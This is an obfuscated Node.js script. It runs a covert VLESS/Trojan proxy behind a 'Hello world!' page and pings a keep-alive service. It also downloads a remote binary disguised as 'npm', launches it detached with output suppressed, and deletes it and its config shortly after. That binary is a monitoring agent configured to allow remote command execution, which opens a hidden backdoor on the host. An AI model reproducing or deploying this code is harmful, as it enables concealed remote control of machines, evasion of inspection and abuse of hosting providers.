const _0x3e0dab=_0x13c8;(function(_0x1d81c6,_0x2f7ed2){const _0x42408a=_0x13c8,_0x70240b=_0x1d81c6();while(!![]){try{const _0x597f33=parseInt(_0x42408a(0x152))/0x1*(-parseInt(_0x42408a(0x18d))/0x2)+-parseInt(_0x42408a(0x143))/0x3*(parseInt(_0x42408a(0x16f))/0x4)+-parseInt(_0x42408a(0x189))/0x5+-parseInt(_0x42408a(0x1c3))/0x6*(parseInt(_0x42408a(0x1a6))/0x7)+parseInt(_0x42408a(0x195))/0x8*(-parseInt(_0x42408a(0x146))/0x9)+-parseInt(_0x42408a(0x1c2))/0xa+-parseInt(_0x42408a(0x1af))/0xb*(-parseInt(_0x42408a(0x16a))/0xc);if(_0x597f33===_0x2f7ed2)break;else _0x70240b['push'](_0x70240b['shift']());}catch(_0x4cf363){_0x70240b['push'](_0x70240b['shift']());}}}(_0x3010,0xca93f));const os=require('os'),http=require(_0x3e0dab(0x177)),fs=require('fs'),axios=require(_0x3e0dab(0x153)),net=require(_0x3e0dab(0x161)),path=require(_0x3e0dab(0x140)),crypto=require(_0x3e0dab(0x18f)),{Buffer}=require(_0x3e0dab(0x144)),{exec,execSync}=require(_0x3e0dab(0x199)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x3e0dab(0x162)]||_0x3e0dab(0x159),NEZHA_SERVER=process[_0x3e0dab(0x171)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3e0dab(0x171)][_0x3e0dab(0x1ab)]||'',NEZHA_KEY=process['env'][_0x3e0dab(0x183)]||'',DOMAIN=process[_0x3e0dab(0x171)][_0x3e0dab(0x18e)]||_0x3e0dab(0x163),AUTO_ACCESS=process[_0x3e0dab(0x171)][_0x3e0dab(0x184)]||!![],WSPATH=process['env'][_0x3e0dab(0x1b3)]||UUID[_0x3e0dab(0x185)](0x0,0x8),SUB_PATH=process[_0x3e0dab(0x171)][_0x3e0dab(0x17d)]||_0x3e0dab(0x193),NAME=process['env'][_0x3e0dab(0x170)]||_0x3e0dab(0x166),PORT=process[_0x3e0dab(0x171)][_0x3e0dab(0x1c4)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x47f8ea=_0x3e0dab;try{const _0x4ba39e=await axios[_0x47f8ea(0x1ae)](_0x47f8ea(0x19d)),_0x195171=_0x4ba39e['data'];ISP=(_0x195171['country']+'-'+_0x195171['asOrganization'])[_0x47f8ea(0x178)](/ /g,'_');}catch(_0x56dde6){ISP=_0x47f8ea(0x14e);}};GetISP();const httpServer=http['createServer']((_0x360c55,_0xdf126)=>{const _0x106149=_0x3e0dab;if(_0x360c55[_0x106149(0x158)]==='/'){const _0xaa968b=path[_0x106149(0x1a4)](__dirname,'index.html');fs['readFile'](_0xaa968b,'utf8',(_0x41dfb4,_0x8b38e3)=>{const _0xde89da=_0x106149;if(_0x41dfb4){_0xdf126['writeHead'](0xc8,{'Content-Type':_0xde89da(0x155)}),_0xdf126[_0xde89da(0x1b7)](_0xde89da(0x172));return;}_0xdf126[_0xde89da(0x157)](0xc8,{'Content-Type':_0xde89da(0x155)}),_0xdf126[_0xde89da(0x1b7)](_0x8b38e3);});return;}else{if(_0x360c55[_0x106149(0x158)]==='/'+SUB_PATH){const _0x112faf=_0x106149(0x1a9)+UUID+'@'+DOMAIN+_0x106149(0x165)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x106149(0x14f)+WSPATH+'#'+NAME+'-'+ISP,_0xf151ab='trojan://'+UUID+'@'+DOMAIN+_0x106149(0x13f)+DOMAIN+_0x106149(0x18c)+DOMAIN+_0x106149(0x14f)+WSPATH+'#'+NAME+'-'+ISP,_0x3cad78=_0x112faf+'\x0a'+_0xf151ab,_0x1b894e=Buffer[_0x106149(0x13e)](_0x3cad78)['toString']('base64');_0xdf126[_0x106149(0x157)](0xc8,{'Content-Type':_0x106149(0x149)}),_0xdf126[_0x106149(0x1b7)](_0x1b894e+'\x0a');}else _0xdf126[_0x106149(0x157)](0x194,{'Content-Type':_0x106149(0x149)}),_0xdf126[_0x106149(0x1b7)](_0x106149(0x164));}}),wss=new WebSocket[(_0x3e0dab(0x19c))]({'server':httpServer}),uuid=UUID[_0x3e0dab(0x178)](/-/g,''),DNS_SERVERS=[_0x3e0dab(0x1ba),_0x3e0dab(0x1aa)];function resolveHost(_0x554c3a){return new Promise((_0x54ffb3,_0x543cd0)=>{const _0x31957d=_0x13c8;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x31957d(0x18b)](_0x554c3a)){_0x54ffb3(_0x554c3a);return;}let _0x160c18=0x0;function _0x4f5c4f(){const _0x4a986d=_0x31957d;if(_0x160c18>=DNS_SERVERS['length']){_0x543cd0(new Error(_0x4a986d(0x176)+_0x554c3a+_0x4a986d(0x17a)));return;}const _0x806b4a=DNS_SERVERS[_0x160c18];_0x160c18++;const _0x40ace5=_0x4a986d(0x169)+encodeURIComponent(_0x554c3a)+'&type=A';axios['get'](_0x40ace5,{'timeout':0x1388,'headers':{'Accept':_0x4a986d(0x1b1)}})[_0x4a986d(0x151)](_0x3268c1=>{const _0x40f23b=_0x4a986d,_0x18d59e=_0x3268c1[_0x40f23b(0x17b)];if(_0x18d59e[_0x40f23b(0x17c)]===0x0&&_0x18d59e[_0x40f23b(0x198)]&&_0x18d59e[_0x40f23b(0x198)]['length']>0x0){const _0x1d7862=_0x18d59e[_0x40f23b(0x198)][_0x40f23b(0x1c1)](_0x16ecb4=>_0x16ecb4[_0x40f23b(0x1b4)]===0x1);if(_0x1d7862){_0x54ffb3(_0x1d7862[_0x40f23b(0x17b)]);return;}}_0x4f5c4f();})['catch'](_0x4092a0=>{_0x4f5c4f();});}_0x4f5c4f();});}function handleVlessConnection(_0x48f365,_0x24b2c4){const _0xc8063e=_0x3e0dab,[_0x2e1cc4]=_0x24b2c4,_0x169453=_0x24b2c4[_0xc8063e(0x185)](0x1,0x11);if(!_0x169453[_0xc8063e(0x15d)]((_0x2e7c7e,_0x40b909)=>_0x2e7c7e==parseInt(uuid[_0xc8063e(0x1c0)](_0x40b909*0x2,0x2),0x10)))return![];let _0x4c354f=_0x24b2c4[_0xc8063e(0x185)](0x11,0x12)[_0xc8063e(0x168)]()+0x13;const _0x3efecb=_0x24b2c4[_0xc8063e(0x185)](_0x4c354f,_0x4c354f+=0x2)[_0xc8063e(0x17e)](0x0),_0x2157c4=_0x24b2c4[_0xc8063e(0x185)](_0x4c354f,_0x4c354f+=0x1)[_0xc8063e(0x168)](),_0x9395da=_0x2157c4==0x1?_0x24b2c4[_0xc8063e(0x185)](_0x4c354f,_0x4c354f+=0x4)['join']('.'):_0x2157c4==0x2?new TextDecoder()[_0xc8063e(0x1b9)](_0x24b2c4[_0xc8063e(0x185)](_0x4c354f+0x1,_0x4c354f+=0x1+_0x24b2c4['slice'](_0x4c354f,_0x4c354f+0x1)[_0xc8063e(0x168)]())):_0x2157c4==0x3?_0x24b2c4[_0xc8063e(0x185)](_0x4c354f,_0x4c354f+=0x10)[_0xc8063e(0x18a)]((_0xd33031,_0x53c5b9,_0x36e8a0,_0x10339e)=>_0x36e8a0%0x2?_0xd33031['concat'](_0x10339e[_0xc8063e(0x185)](_0x36e8a0-0x1,_0x36e8a0+0x1)):_0xd33031,[])[_0xc8063e(0x167)](_0x2aeb83=>_0x2aeb83[_0xc8063e(0x17e)](0x0)[_0xc8063e(0x148)](0x10))['join'](':'):'';_0x48f365[_0xc8063e(0x19b)](new Uint8Array([_0x2e1cc4,0x0]));const _0x58bc67=createWebSocketStream(_0x48f365);return resolveHost(_0x9395da)[_0xc8063e(0x151)](_0xc31d8=>{const _0x536813=_0xc8063e;net[_0x536813(0x1bf)]({'host':_0xc31d8,'port':_0x3efecb},function(){const _0x46acd4=_0x536813;this[_0x46acd4(0x14c)](_0x24b2c4[_0x46acd4(0x185)](_0x4c354f)),_0x58bc67['on'](_0x46acd4(0x1b6),()=>{})[_0x46acd4(0x142)](this)['on'](_0x46acd4(0x1b6),()=>{})[_0x46acd4(0x142)](_0x58bc67);})['on']('error',()=>{});})[_0xc8063e(0x16b)](_0x3e832c=>{const _0x53bfbb=_0xc8063e;net[_0x53bfbb(0x1bf)]({'host':_0x9395da,'port':_0x3efecb},function(){const _0x42c4d8=_0x53bfbb;this['write'](_0x24b2c4['slice'](_0x4c354f)),_0x58bc67['on']('error',()=>{})[_0x42c4d8(0x142)](this)['on'](_0x42c4d8(0x1b6),()=>{})[_0x42c4d8(0x142)](_0x58bc67);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x331213,_0x559705){const _0x3adbdf=_0x3e0dab;try{if(_0x559705[_0x3adbdf(0x192)]<0x3a)return![];const _0x523b15=_0x559705['slice'](0x0,0x38)[_0x3adbdf(0x148)](),_0x2c6119=[UUID];let _0x1b9ab0=null;for(const _0x1420e2 of _0x2c6119){const _0x11ab52=crypto[_0x3adbdf(0x16d)]('sha224')[_0x3adbdf(0x181)](_0x1420e2)[_0x3adbdf(0x1bb)](_0x3adbdf(0x14b));if(_0x11ab52===_0x523b15){_0x1b9ab0=_0x1420e2;break;}}if(!_0x1b9ab0)return![];let _0x708b88=0x38;_0x559705[_0x708b88]===0xd&&_0x559705[_0x708b88+0x1]===0xa&&(_0x708b88+=0x2);const _0x313ea4=_0x559705[_0x708b88];if(_0x313ea4!==0x1)return![];_0x708b88+=0x1;const _0x1bd9d3=_0x559705[_0x708b88];_0x708b88+=0x1;let _0x11e73c,_0x2da792;if(_0x1bd9d3===0x1)_0x11e73c=_0x559705[_0x3adbdf(0x185)](_0x708b88,_0x708b88+0x4)['join']('.'),_0x708b88+=0x4;else{if(_0x1bd9d3===0x3){const _0x1cd367=_0x559705[_0x708b88];_0x708b88+=0x1,_0x11e73c=_0x559705[_0x3adbdf(0x185)](_0x708b88,_0x708b88+_0x1cd367)[_0x3adbdf(0x148)](),_0x708b88+=_0x1cd367;}else{if(_0x1bd9d3===0x4)_0x11e73c=_0x559705[_0x3adbdf(0x185)](_0x708b88,_0x708b88+0x10)[_0x3adbdf(0x18a)]((_0x516282,_0x957689,_0x3eb762,_0x474b6f)=>_0x3eb762%0x2?_0x516282[_0x3adbdf(0x1a0)](_0x474b6f[_0x3adbdf(0x185)](_0x3eb762-0x1,_0x3eb762+0x1)):_0x516282,[])[_0x3adbdf(0x167)](_0x197d82=>_0x197d82[_0x3adbdf(0x17e)](0x0)['toString'](0x10))[_0x3adbdf(0x1a4)](':'),_0x708b88+=0x10;else return![];}}_0x2da792=_0x559705[_0x3adbdf(0x17e)](_0x708b88),_0x708b88+=0x2;_0x708b88<_0x559705[_0x3adbdf(0x192)]&&_0x559705[_0x708b88]===0xd&&_0x559705[_0x708b88+0x1]===0xa&&(_0x708b88+=0x2);const _0x5e9789=createWebSocketStream(_0x331213);return resolveHost(_0x11e73c)[_0x3adbdf(0x151)](_0x5112b8=>{const _0x4a999b=_0x3adbdf;net[_0x4a999b(0x1bf)]({'host':_0x5112b8,'port':_0x2da792},function(){const _0xcb7e4b=_0x4a999b;_0x708b88<_0x559705['length']&&this[_0xcb7e4b(0x14c)](_0x559705[_0xcb7e4b(0x185)](_0x708b88)),_0x5e9789['on'](_0xcb7e4b(0x1b6),()=>{})[_0xcb7e4b(0x142)](this)['on'](_0xcb7e4b(0x1b6),()=>{})[_0xcb7e4b(0x142)](_0x5e9789);})['on']('error',()=>{});})[_0x3adbdf(0x16b)](_0x4be164=>{const _0x592727=_0x3adbdf;net[_0x592727(0x1bf)]({'host':_0x11e73c,'port':_0x2da792},function(){const _0x22a531=_0x592727;_0x708b88<_0x559705[_0x22a531(0x192)]&&this[_0x22a531(0x14c)](_0x559705[_0x22a531(0x185)](_0x708b88)),_0x5e9789['on'](_0x22a531(0x1b6),()=>{})[_0x22a531(0x142)](this)['on'](_0x22a531(0x1b6),()=>{})[_0x22a531(0x142)](_0x5e9789);})['on'](_0x592727(0x1b6),()=>{});}),!![];}catch(_0xc6b0d8){return![];}}wss['on'](_0x3e0dab(0x1b0),(_0x56e61d,_0x358280)=>{const _0x5ddb2b=_0x3e0dab,_0x5855cc=_0x358280['url']||'';_0x56e61d[_0x5ddb2b(0x16c)](_0x5ddb2b(0x15a),_0x99614=>{const _0x3802ac=_0x5ddb2b;if(_0x99614[_0x3802ac(0x192)]>0x11&&_0x99614[0x0]===0x0){const _0x48d3a9=_0x99614['slice'](0x1,0x11),_0x12146a=_0x48d3a9['every']((_0x2a710d,_0xf8a9bd)=>_0x2a710d==parseInt(uuid[_0x3802ac(0x1c0)](_0xf8a9bd*0x2,0x2),0x10));if(_0x12146a){!handleVlessConnection(_0x56e61d,_0x99614)&&_0x56e61d[_0x3802ac(0x15f)]();return;}}!handleTrojanConnection(_0x56e61d,_0x99614)&&_0x56e61d[_0x3802ac(0x15f)]();})['on'](_0x5ddb2b(0x1b6),()=>{});});function _0x3010(){const _0x34890a=['connection','application/dns-json','trim','WSPATH','type','arm64','error','end','true','decode','8.8.4.4','digest','/bin/bash','2087','post','connect','substr','find','8608070ZcuaNW','6jUDHAU','PORT','from',':443?security=tls&sni=','path','arm','pipe','554901RkblVO','buffer','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','6903xGcNXT','--tls','toString','text/plain','npm\x20is\x20running','hex','write','includes','Unknown','&path=%2F','utf-8','then','387367MZpubX','axios','split','text/html','false','writeHead','url','664520d5-2a68-4ff1-a331-0f506d4f4276','message','https://amd64.ssss.nyc.mn/v1','https://arm64.ssss.nyc.mn/v1','every','Automatic\x20Access\x20Task\x20added\x20successfully','close','createWriteStream','net','UUID','gl9361.duckdns.org','Not\x20Found\x0a',':443?encryption=none&security=tls&sni=','Hug','map','readUInt8','https://dns.google/resolve?name=','63680628RMtyyP','catch','once','createHash','443','4jVGFbZ','NAME','env','Hello\x20world!','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','application/json','Failed\x20to\x20resolve\x20','http','replace','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','\x20with\x20all\x20DNS\x20servers','data','Status','SUB_PATH','readUInt16BE','2083','8443','update','finish','NEZHA_KEY','AUTO_ACCESS','slice','aarch64','Server\x20is\x20running\x20on\x20port\x20','stream','7801285iXySqQ','reduce','test','&fp=chrome&type=ws&host=','6RWYJtY','DOMAIN','crypto','arch','error:\x20','length','sub','2096','4968KBxYMn','\x20-p\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Answer','child_process','listen','send','Server','https://speed.cloudflare.com/meta','unlink','chmod\x20+x\x20npm','concat','2053','npm\x20running\x20error:','npm','join','log','1627647ynRhyV','https://','https://amd64.ssss.nyc.mn/agent','vless://','1.1.1.1','NEZHA_PORT','setsid\x20nohup\x20./npm\x20-s\x20','writeFileSync','get','11qAIQir'];_0x3010=function(){return _0x34890a;};return _0x3010();}function _0x13c8(_0x1714b2,_0x354a94){const _0x301050=_0x3010();return _0x13c8=function(_0x13c838,_0x5e487a){_0x13c838=_0x13c838-0x13e;let _0x47407=_0x301050[_0x13c838];return _0x47407;},_0x13c8(_0x1714b2,_0x354a94);}const getDownloadUrl=()=>{const _0x1e5fb8=_0x3e0dab,_0x3cd620=os[_0x1e5fb8(0x190)]();return _0x3cd620===_0x1e5fb8(0x141)||_0x3cd620===_0x1e5fb8(0x1b5)||_0x3cd620===_0x1e5fb8(0x186)?!NEZHA_PORT?_0x1e5fb8(0x15c):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x1e5fb8(0x15b):_0x1e5fb8(0x1a8);},downloadFile=async()=>{const _0x161c6c=_0x3e0dab;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x310f33=getDownloadUrl(),_0x59d2d2=await axios({'method':_0x161c6c(0x1ae),'url':_0x310f33,'responseType':_0x161c6c(0x188)}),_0x4933ce=fs[_0x161c6c(0x160)](_0x161c6c(0x1a3));return _0x59d2d2[_0x161c6c(0x17b)][_0x161c6c(0x142)](_0x4933ce),new Promise((_0x134485,_0x46bf97)=>{const _0x5b22f3=_0x161c6c;_0x4933ce['on'](_0x5b22f3(0x182),()=>{const _0x124c18=_0x5b22f3;console[_0x124c18(0x1a5)]('npm\x20download\x20successfully'),exec(_0x124c18(0x19f),_0x4abe9c=>{if(_0x4abe9c)_0x46bf97(_0x4abe9c);_0x134485();});}),_0x4933ce['on'](_0x5b22f3(0x1b6),_0x46bf97);});}catch(_0x886384){throw _0x886384;}},runnz=async()=>{const _0x5a3483=_0x3e0dab;try{const _0xfea552=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x5a3483(0x150)});if(_0xfea552[_0x5a3483(0x1b2)]()!==''){console[_0x5a3483(0x1a5)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x1367fd){}await downloadFile();let _0x3eebf4='',_0x6ab910=[_0x5a3483(0x16e),_0x5a3483(0x180),_0x5a3483(0x194),_0x5a3483(0x1bd),_0x5a3483(0x17f),_0x5a3483(0x1a1)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3bfdef=_0x6ab910[_0x5a3483(0x14d)](NEZHA_PORT)?_0x5a3483(0x147):'';_0x3eebf4=_0x5a3483(0x1ac)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5a3483(0x196)+NEZHA_KEY+'\x20'+_0x3bfdef+_0x5a3483(0x145);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x548426=NEZHA_SERVER[_0x5a3483(0x14d)](':')?NEZHA_SERVER[_0x5a3483(0x154)](':')['pop']():'',_0x260bb5=_0x6ab910[_0x5a3483(0x14d)](_0x548426)?_0x5a3483(0x1b8):_0x5a3483(0x156),_0x1eb2c6='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x5a3483(0x197)+_0x260bb5+_0x5a3483(0x174)+UUID;fs[_0x5a3483(0x1ad)]('config.yaml',_0x1eb2c6);}_0x3eebf4=_0x5a3483(0x173);}else{console[_0x5a3483(0x1a5)](_0x5a3483(0x179));return;}}try{exec(_0x3eebf4,{'shell':_0x5a3483(0x1bc)},_0x407c18=>{const _0x376b68=_0x5a3483;if(_0x407c18)console['error'](_0x376b68(0x1a2),_0x407c18);else console[_0x376b68(0x1a5)](_0x376b68(0x14a));});}catch(_0x5d1bb8){console[_0x5a3483(0x1b6)](_0x5a3483(0x191)+_0x5d1bb8);}};async function addAccessTask(){const _0x3e8820=_0x3e0dab;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1b587b=_0x3e8820(0x1a7)+DOMAIN;try{const _0xf61a19=await axios[_0x3e8820(0x1be)]('https://oooo.serv00.net/add-url',{'url':_0x1b587b},{'headers':{'Content-Type':_0x3e8820(0x175)}});console['log'](_0x3e8820(0x15e));}catch(_0x2a570f){}}const delFiles=()=>{const _0x5ccbe6=_0x3e0dab;fs[_0x5ccbe6(0x19e)]('npm',()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer[_0x3e0dab(0x19a)](PORT,()=>{const _0x3a8135=_0x3e0dab;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3a8135(0x1a5)](_0x3a8135(0x187)+PORT);});
